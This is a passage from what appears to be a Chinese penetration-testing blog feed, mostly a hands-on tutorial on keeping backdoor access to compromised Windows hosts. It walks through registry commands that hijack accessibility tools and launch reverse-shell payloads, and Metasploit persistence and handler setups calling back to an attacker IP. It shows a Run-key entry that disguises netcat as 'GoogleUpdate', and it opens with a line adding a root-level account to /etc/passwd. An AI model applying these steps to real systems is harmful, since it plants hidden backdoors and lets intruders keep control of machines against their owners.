class="code"><pre><code class="hljs ada">perl -e <span class="hljs-symbol">&#x27;print</span> crypt(<span class="hljs-string">&quot;mingy&quot;</span>,<span class="hljs-string">&quot;adgfagm&quot;</span>).<span class="hljs-string">&quot;\n&quot;</span>&#x27;<br>adu01teZNx5nY<br>echo <span class="hljs-string">&quot;weblogic1:adu01teZNx5nY:0:0:root:/root:/bin/bash&quot;</span> &gt;&gt; /etc/passwd<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windwos权限维持</title>
    <link href="/2024/02/16/%E6%B8%97%E9%80%8F/windwos%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    <url>/2024/02/16/%E6%B8%97%E9%80%8F/windwos%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
    
    <content type="html"><![CDATA[<h1 id="权限维持简介"><a href="#权限维持简介" class="headerlink" title="权限维持简介"></a>权限维持简介</h1><blockquote><p>为了保证获取到的目标权限不会因为漏洞的修复而丢失，攻击者通常会在目标上安装一个后门，来保证对目标的持久化控制。</p></blockquote><p>就是安装后门</p><h1 id="系统工具替换后门"><a href="#系统工具替换后门" class="headerlink" title="系统工具替换后门"></a>系统工具替换后门</h1><blockquote><p>当我们按照常理运行属于IFEO列表的文件的时候（即可执行文件名在上述的注册表项下，出于简化原  因，IFEO使用忽略路径的方式来匹配它所要控制的程序文件名，所以程序无论放在哪个路径，只要名  字没有变化，它就可以正常运行。）会执行相关的选项参数，这里我们主要利用的参数是 debugger,  通过该参数我们可以实现偷梁换柱。 </p></blockquote><h2 id="常用辅助功能"><a href="#常用辅助功能" class="headerlink" title="常用辅助功能"></a>常用辅助功能</h2><blockquote><ol><li>Shift（sethc）  </li><li>屏幕键盘（osk）  </li><li>辅助工具管理器（Utilman）   </li><li>讲述人（Narrator）</li></ol></blockquote><h2 id="简单演示"><a href="#简单演示" class="headerlink" title="简单演示"></a>简单演示</h2><p>在对方开启rdp的情况之下，我们可以使用登录界面的，讲述人，放大镜等功能实现权限维持</p><p>也就是说，将对应的功能换成自己的payload </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216085130074.png" alt="image-20240216085130074"></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>Windows 的辅助功能提供了额外的选项（屏幕键盘，放大镜，屏幕阅读等），可以帮助特殊人士更容易地使用操作系统。  </p><p>然而，这种功能可能会被滥用于在启用 RDP 并获得 Administrator 权限的主机上实现持久化访问。  这种技术会接触磁盘，或者需要修改注册表来执行远程存储的 payload。涉及到的注册表项为 IFEO（Image File Execution Options） ，默认是只有管理员和Local  system有权读写修改。</p></blockquote><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-type">HKEY_LOCAL</span><span class="hljs-type">_MACHINE</span>\<span class="hljs-variable">SOFTWARE</span>\<span class="hljs-variable">Microsoft</span>\<span class="hljs-variable">Windows</span> <span class="hljs-variable">NT</span>\<span class="hljs-variable">CurrentVersion</span>\<span class="hljs-built_in">Image</span> <span class="hljs-built_in">File</span> <span class="hljs-variable">Execution</span> <span class="hljs-built_in">Options</span><br></code></pre></td></tr></table></figure><p>关于注册表</p><p>可以理解为windwos的大型的数据库</p><p>使用win+r进入注册表</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">regedit</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216085706649.png" alt="image-20240216085706649"></p><p>存储的数据都是windwos运行中需要使用的数据，程序运行，程序本生的信息都在注册表</p><p>然后根据上面的进行查找</p><p>可能发现就和我上截图一样发现并没有HKEY_LOCAL_MACHINE的文件夹，可能是用户权限不允许的原因</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216090130363.png" alt="image-20240216090130363"></p><p>发现存在</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><blockquote><p>当我们按照常理运行属于IFEO列表的文件的时候（即可执行文件名在上述的注册表项下，出于简化原  因，IFEO使用忽略路径的方式来匹配它所要控制的程序文件名，所以程序无论放在哪个路径，只要名  字没有变化，它就可以正常运行。）会执行相关的选项参数，这里我们主要利用的参数是 debugger,  通过该参数我们可以实现偷梁换柱。  </p></blockquote><p>就是劫持的原理，由于他不会检查路径所以我们直接放置我们的payload ，然后需要修改为劫持应用的名字，从而实现劫持</p><blockquote><ol><li>Shift（sethc，粘滞键）  2. 屏幕键盘（osk）  3. 辅助工具管理器（Utilman）  4. 讲述人（Narrator）</li></ol></blockquote><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><h3 id="劫持ie"><a href="#劫持ie" class="headerlink" title="劫持ie"></a>劫持ie</h3><p>  以修改IE启动程序为例，实现运行IE程序但是启动的却是cmd。  </p><ol><li><p>找到注册表 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows  NT\CurrentVersion\Image  File Execution Options 目录下的 iexplore.exe  </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216095152453.png" alt="image-20240216095152453"></p></li><li><p>添加一个debugger字符串键值，并且赋值为 cmd.exe 的执行路径</p></li></ol><p>   这里是需要执行什么就填什么的路径</p><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216095327505.png" alt="image-20240216095327505"></p>   <figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">C:</span>\Windows\system32\cmd.exe<br></code></pre></td></tr></table></figure><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216100219800.png" alt="image-20240216100219800"></p><p>   如果发现没有<code>explore.exe</code>程序的话，那就直接创建 一个项</p><p>   然后将添加修改这个项</p><p>   现在运行ie </p><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216100339246.png" alt="image-20240216100339246"></p><p>   就是cmd了</p><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216100435859.png" alt="image-20240216100435859"></p><p>   复原之后</p><ol start="3"><li><p>也可以直接使用<code>reg</code>命令</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">REG <span class="hljs-keyword">ADD</span><span class="language-bash"> <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe&quot;</span> /t REG_SZ /v Debugger /d <span class="hljs-string">&quot;C:\windows\system32\cmd.exe&quot;</span> /f</span><br></code></pre></td></tr></table></figure><p>现在模拟权限维持</p><p>上线之后</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216101905870.png" alt="image-20240216101905870"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216101926352.png" alt="image-20240216101926352"></p><p>发现已经添加</p></li></ol><h3 id="劫持-Narrator"><a href="#劫持-Narrator" class="headerlink" title="劫持  Narrator"></a>劫持  Narrator</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">REG <span class="hljs-keyword">ADD</span><span class="language-bash"> <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe&quot;</span> /t REG_SZ /v Debugger /d <span class="hljs-string">&quot;C:\windows\system32\cmd.exe&quot;</span> /f</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216102138392.png" alt="image-20240216102138392"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216102143408.png" alt="image-20240216102143408"></p><p>现在通过远程桌面连接，就直接返回到登录界面进行模拟</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216102921248.png" alt="image-20240216102921248"></p><p>还是system权限注意，如果没有密码可能发现登陆不上</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216103052920.png" alt="image-20240216103052920"></p><p>远程桌面连接也是一样的</p><h3 id="劫持-Utilman-辅助管理器"><a href="#劫持-Utilman-辅助管理器" class="headerlink" title="劫持  Utilman   辅助管理器"></a>劫持  Utilman   辅助管理器</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">REG <span class="hljs-keyword">ADD</span><span class="language-bash"> <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe&quot;</span> /t REG_SZ /v Debugger /d <span class="hljs-string">&quot;C:\windows\system32\cmd.exe&quot;</span> /f</span><br></code></pre></td></tr></table></figure><h3 id="notepad"><a href="#notepad" class="headerlink" title="notepad"></a>notepad</h3><p>实现原程序退出后，静默运行后门程序。从而执行notepad 为例，推出后静默运行calc.exe</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&quot;</span> /v GlobalFlag /t REG_DWORD /d 512 /f</span><br><br>reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot;</span> /v ReportingMode /t REG_DWORD /d 1 /f</span><br><br>reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot;</span> /v MonitorProcess /t REG_SZ /d <span class="hljs-string">&quot;C:\Windows\system32\calc.exe&quot;</span> /f</span><br><br><span class="hljs-comment"># 可以更改C:\Windows\system32\calc.exe为payload，如powershell命令</span><br></code></pre></td></tr></table></figure><p>我现在模拟运行cmd之后运行payload</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmd.exe&quot;</span> /v GlobalFlag /t REG_DWORD /d 512 /f</span><br><br>reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\cmd.exe&quot;</span> /v ReportingMode /t REG_DWORD /d 1 /f</span><br><br>reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\cmd.exe&quot;</span> /v MonitorProcess /t REG_SZ /d <span class="hljs-string">&quot;C:\w_x64_reverse_9999.exe&quot;</span> /f</span><br><br><span class="hljs-comment"># 可以更改C:\Windows\system32\calc.exe为payload，如powershell命令</span><br></code></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">MonitorProcess：表示监视器进程<br>ReportingMode：可以设置为以下三个值<br>0x1：LAUNCH<span class="hljs-emphasis">_MONITORPROCESS，检测到进程静默退出时，将会启动监视器进程，即</span><br><span class="hljs-emphasis">MonitorProcess 的项值</span><br><span class="hljs-emphasis">0x2：LOCAL_</span>DUMP，检测到进程静默退出时，将会为受监视的进程创建转储文件<br>0x3：NOTIFICATION，检查到进程静默退出时，将会弹出一个通知\<br></code></pre></td></tr></table></figure><p>发现cmd不太行，但是我是用notepad 是可以的</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216111320006.png" alt="image-20240216111320006"></p><h2 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h2><h3 id="sticky-keys"><a href="#sticky-keys" class="headerlink" title="sticky_keys"></a>sticky_keys</h3><blockquote><p>Metasploit 框架提供了一个后渗透模块，可实现自动化地利用沾滞键的权限维持技术。  该模块将用 CMD 替换辅助功能的二进制文件（sethc, osk, disp, utilman）。  </p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">use post<span class="hljs-regexp">/windows/m</span>anage/sticky_keys<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216110351370.png" alt="image-20240216110351370"></p><p>TARGET  是粘滞键</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216110442127.png" alt="image-20240216110442127"></p><p>成功添加</p><p>模拟访问</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216110602534.png" alt="image-20240216110602534"></p><p>连按5次 shift</p><p>将Exe 换成我们指定的文件</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216110823503.png" alt="image-20240216110823503"></p><p>连续按5次shift 之后</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216110916975.png" alt="image-20240216110916975"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216111034670.png" alt="image-20240216111034670"></p><p>system权限的</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216111214241.png" alt="image-20240216111214241"></p><p>查看Windows 之后发现这个被创建</p><h1 id="msf-1"><a href="#msf-1" class="headerlink" title="msf"></a>msf</h1><h2 id="Persistence模块"><a href="#Persistence模块" class="headerlink" title="Persistence模块"></a>Persistence模块</h2><p>重启触发</p><blockquote><p>  exploit&#x2F;windows&#x2F;local&#x2F;persistence  </p></blockquote><blockquote><p>Persistence 模块首先上传 vbs 脚本，然后执行vbs脚本修改注册表  HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 或  HKLM\Software\Microsoft\Windows\CurrentVersion\Run从而完成自启动。  </p></blockquote><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/windows/local/persistence<br><span class="hljs-keyword">set</span> session <span class="hljs-comment">1</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">payload windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">DELAY     <span class="hljs-number">10</span>               yes       持久性有效载荷不断重新连接回来的延迟（秒）。<br>EXE_NAME                   <span class="hljs-keyword">no</span>        将在目标主机上使用的有效载荷的文件名（默认为%RAND%.exe）。<br><span class="hljs-type">PATH</span>                       <span class="hljs-keyword">no</span>        写入有效载荷的路径（默认为%<span class="hljs-keyword">TEMP</span>%）。<br>REG_NAME                   <span class="hljs-keyword">no</span>        在目标主机上调用注册表值进行持久化的名称（默认为%RAND%）。<br><span class="hljs-keyword">SESSION</span>   <span class="hljs-number">1</span>                yes       运行该模块的会话<br>STARTUP   <span class="hljs-keyword">USER</span>             yes       持久性有效载荷的启动类型。(接受：<span class="hljs-keyword">USER</span>, <span class="hljs-keyword">SYSTEM</span>)<br>VBS_NAME                   <span class="hljs-keyword">no</span>        目标主机上的VBS持久化脚本要使用的文件名（默认为%RAND%）。<br></code></pre></td></tr></table></figure><p>这个模块的原理，使用可以子自运行的注册表项，然后自运行</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216113647895.png" alt="image-20240216113647895"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216113806741.png" alt="image-20240216113806741"></p><p>发现擦创建了对应的payload</p><p>查看注册表时发现是HKCU </p><p>发现并没有在注册表里，但是这个是缩写，缩写原则是前一个单词的前两个字母，和后两个单词的首字母</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216114441656.png" alt="image-20240216114441656"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216114845032.png" alt="image-20240216114845032"></p><h2 id="Autorunscript"><a href="#Autorunscript" class="headerlink" title="Autorunscript"></a>Autorunscript</h2><blockquote><p>  获取shell的时候自动执行持续化脚本，可以被 Autorunscript 执行的命令目录在  metasploit&#x2F;scripts&#x2F;meterpreter。  </p></blockquote><ul><li><p>persistence</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs diff">meterpreter &gt; run persistence -h<br><br><span class="hljs-deletion">-A：自动启动一个匹配的漏洞/多/处理程序来连接到代理</span><br><span class="hljs-deletion">-X：开机启动，注册表位置：</span><br>    HKLM\Software\Microsoft\Windows\CurrentVersion\Run<br><span class="hljs-deletion">-U：当前用户登录后自启动，注册表位置：</span><br>    HKCU\Software\Microsoft\Windows\CurrentVersion\Run<br><span class="hljs-deletion">-S：作为服务启动，注册表位置：</span><br>    HKLM\Software\Microsoft\Windows\CurrentVersion\Run<br><span class="hljs-deletion">-T：选择要使用的可执行模板</span><br><span class="hljs-deletion">-L：后门传到远程主机的位置默认为 %TEMP%</span><br><span class="hljs-deletion">-P：使用的Payload，默认windows/meterpreter/reverse_tcp，</span><br>    该默认的payload生成的后门为32位程序<br>    因此，当目标机器为64位系统时，留下的后门将无法运行<br><span class="hljs-deletion">-i：设置反向连接间隔时间，单位为秒</span><br><span class="hljs-deletion">-p：设置反向连接的端口号</span><br><span class="hljs-deletion">-r：设置反向连接的ip地址</span><br></code></pre></td></tr></table></figure><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/multi/handler<br><span class="hljs-keyword">set</span> PAYLOAD <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LHOST 192.168.78.117</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LPORT 5555</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">ExitOnSession false</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">AutoRunScript persistence -r 192.168.78.117 -p 5556 -U -X -i 30</span><br>exploit<br></code></pre></td></tr></table></figure><p>在创建handler 的时候指定运行的脚本，意思就是说当执行有连接的时候，就会触发这个</p></li><li><p>migrate</p></li></ul><p>  进程迁移操作</p>  <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># migrate</span><br><br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> LHOST 192.168.78.117<br><span class="hljs-built_in">set</span> LPORT 5555<br><span class="hljs-built_in">set</span> ExitOnSession <span class="hljs-literal">false</span><br><span class="hljs-built_in">set</span> AutoRunScript migrate -f<br>exploit<br></code></pre></td></tr></table></figure><p>  <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216122125942.png" alt="image-20240216122125942"></p><p>  尝试迁移到具体的进程名字</p><p>  <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216122620871.png" alt="image-20240216122620871"></p><p>  发现参数指定错了</p><p>  使用-n</p><p>  <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216122852964.png" alt="image-20240216122852964"></p><p>  进程迁移的原理</p><p>  先获取指定的进程的句柄，从而打开这个进程，然后申请一个内存用于执行shellcode 然后使用内存复制的函数，将原来的shellcode 执行，从而实现了内存注入</p><p>  可以考虑为，使用ce 修改单机游戏的内存然后获取数值 上面的添加</p><h1 id="开机自启动的注册表项"><a href="#开机自启动的注册表项" class="headerlink" title="开机自启动的注册表项"></a>开机自启动的注册表项</h1><p>使用这个方式的话，当受害者开机的话就会执行payload</p><blockquote><p>注册表的 HKEY_LOCAL_MACHINE 和 HKEY_CURRENT_USER 键的区别：前者对所有用户有效，后者只对当前用户有效</p></blockquote><h2 id="run"><a href="#run" class="headerlink" title="run"></a>run</h2><blockquote><p>每一次系统启动时都是按照顺序自动的执行。是自动运行最常用用的键</p></blockquote><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run<br>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run<br>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run<br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run<br></code></pre></td></tr></table></figure><h2 id="RunServiceOnce"><a href="#RunServiceOnce" class="headerlink" title="RunServiceOnce"></a>RunServiceOnce</h2><blockquote><p>用于启动服务，启动时间再用户登录之前，而且先于其他方式注册的自启动程序</p></blockquote><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce<br>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce<br></code></pre></td></tr></table></figure><h2 id="RunOnceSetup"><a href="#RunOnceSetup" class="headerlink" title="RunOnceSetup"></a>RunOnceSetup</h2><blockquote><p>指定了用户登录之后运行的程序</p></blockquote><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceSetup<br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceSetup<br></code></pre></td></tr></table></figure><h2 id="Load"><a href="#Load" class="headerlink" title="Load"></a>Load</h2><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows<br></code></pre></td></tr></table></figure><blockquote><p>这个感觉有一点奇怪</p><p>建一个字符串名为load 的键值，为自启动程序的路径，需要注意短文间名规则</p><p>如c:\Program Files 应该为c:\progra~1</p></blockquote><h2 id="Winlogon"><a href="#Winlogon" class="headerlink" title="Winlogon"></a>Winlogon</h2><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon<br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon<br></code></pre></td></tr></table></figure><p>找到 Userinit 键值，默认为 C:\Windows\system32\userinit.exe, 后面加路径，再加逗号  也可以。也能够使系统启动时自动初始化程序。比如：userinit.exe,OSA.exe  </p><p>注意下面的 Notify、Shell 键值也会有自启动的程序，而且其键值可以用逗号分隔，从而实现  </p><p>登录的时候启动多个程序。</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>使用生成的反弹shell的payload  </p><p>在 meterpreter 下执行</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">upload /root/nc.exe C:<span class="hljs-symbol">\\</span>windows<span class="hljs-symbol">\\</span>system32<br>reg enumkey -k HKLM<span class="hljs-symbol">\\</span>software<span class="hljs-symbol">\\</span>microsoft<span class="hljs-symbol">\\</span>windows<span class="hljs-symbol">\\</span>currentversion<span class="hljs-symbol">\\</span>run<br>reg setval -k HKLM<span class="hljs-symbol">\\</span>software<span class="hljs-symbol">\\</span>microsoft<span class="hljs-symbol">\\</span>windows<span class="hljs-symbol">\\</span>currentversion<span class="hljs-symbol">\\</span>run -v GoogleUpdate -d &#x27;C:\windows<span class="hljs-symbol">\t</span>emp\GoogleUpdate.exe&#x27;<br>reg queryval -k HKLM<span class="hljs-symbol">\\</span>software<span class="hljs-symbol">\\</span>microsoft<span class="hljs-symbol">\\</span>windows<span class="hljs-symbol">\\</span>currentversion<span class="hljs-symbol">\\</span>Run -v GoogleUpdate<br>shutdown -r -f -t 0<br></code></pre></td></tr></table></figure><p>在目标cmd 下执行  </p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td 